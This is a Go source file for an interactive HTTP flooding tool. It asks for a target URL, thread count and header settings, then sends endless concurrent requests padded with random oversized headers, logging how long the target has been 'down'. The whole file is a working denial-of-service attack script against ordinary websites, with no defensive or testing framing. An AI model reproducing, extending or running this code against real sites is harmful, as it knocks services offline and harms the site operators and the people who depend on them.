package main

import (
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"time"
)

func main() {

	var URL string
	var Method string
	var Threads int
	var HPR int
	var HeaderSizeChar int

	var CustomHeaders string = "N"
	var SHOWONLYDOWN string = "N"
	var confirmed string = "Y"

	var DoNextCustomHeader string = "N"
	var CustomHeaderName string
	var CustomHeaderBody string

	var HeadersName []string
	var HeadersCont []string

	fmt.Println("=============================================================")
	fmt.Println(" due to golang fmt.scanln please don't make spaces in input!")
	fmt.Println("=============================================================")
	fmt.Print("Website URL <STRING> - ")
	fmt.Scanln(&URL)
	fmt.Print("Method <STRING> - ")
	fmt.Scanln(&Method)
	fmt.Print("Threads <INT> - ")
	fmt.Scanln(&Threads)
	fmt.Print("Headers per request <INT> - ")
	fmt.Scanln(&HPR)
	fmt.Print("Header size (random ascii char) <INT> - ")
	fmt.Scanln(&HeaderSizeChar)
	fmt.Print("Show Only Down [y/N] -> ")
	fmt.Scanln(&SHOWONLYDOWN)
	fmt.Printf("Custom headers [y/N] -> ")
	fmt.Scanln(&CustomHeaders)

	if CustomHeaders == "Y" || CustomHeaders == "y" {
		fmt.Print("\n")
		for {
			fmt.Print("Header name <STRING> - ")
			fmt.Scanln(&CustomHeaderName)
			fmt.Print("Header content <STRING> - ")
			fmt.Scanln(&CustomHeaderBody)

			HeadersName = append(HeadersName, CustomHeaderName)
			HeadersCont = append(HeadersCont, CustomHeaderBody)
			fmt.Println("Do you want to add next header? [y/N] -> ")
			fmt.Scanln(&DoNextCustomHeader)

			if DoNextCustomHeader == "N" || DoNextCustomHeader == "n" {
				break
			} else {
				fmt.Print("\n")
			}
		}

	}
	fmt.Print("\n\n\n=============================================================\n")
	fmt.Println("URL              = " + URL)
	fmt.Println("Method           = " + Method)
	fmt.Printf("Threads          = %d \n", Threads)
	fmt.Printf("HPR              = %d \n", HPR)
	fmt.Printf("Header size      = %d \n\n", +HeaderSizeChar)
	fmt.Println("Log only down     = " + SHOWONLYDOWN)
	fmt.Print("============================================================= \n")
	fmt.Printf("confirm [Y/n] -> ")
	fmt.Scanln(&confirmed)
	var i int

	if confirmed == "y" || confirmed == "Y" {
		for i = 0; i < Threads; i++ {
			go SpamThread(URL, Method, HeaderSizeChar, HPR, SHOWONLYDOWN, HeadersName, HeadersCont)
		}
	}

	for {

	}
}

func SpamThread(URL string, Method string, HeaderSize int, HPR int, OnlyDown string, CustomHeaderName []string, CustomHeaderBody []string) {

	req, err := http.NewRequest(Method, URL, nil)

	if err != nil {
		fmt.Println(err.Error())
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	for i := 0; i < len(CustomHeaderName); i++ {
		req.Header.Set(CustomHeaderName[i], CustomHeaderBody[i])
	}

	var i int
	for i = 0; i < HPR; i++ {
		req.Header.Add(RandStringRunes(HeaderSize), RandStringRunes(HeaderSize))
	}

	for {
		client := &http.Client{}
		resp, err := client.Do(req)

		if err != nil {
			NotResponded(URL)
		} else {
			if resp.StatusCode == 200 {
				if OnlyDown == "n" || OnlyDown == "N" {

					log.Println("[ " + URL + " ]- OK")
				}
				LastRespond = time.Now()
			} else {
				log.Println(resp.StatusCode)
				NotResponded(URL)
			}
		}
	}
}
func RandStringRunes(n int) string {
	var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

var LastRespond time.Time

func NotResponded(URL string) {
	duration := time.Now().Sub(LastRespond)
	log.Printf("[ " + URL + " ] - is down from " + string(duration.String()) + "\n")
}
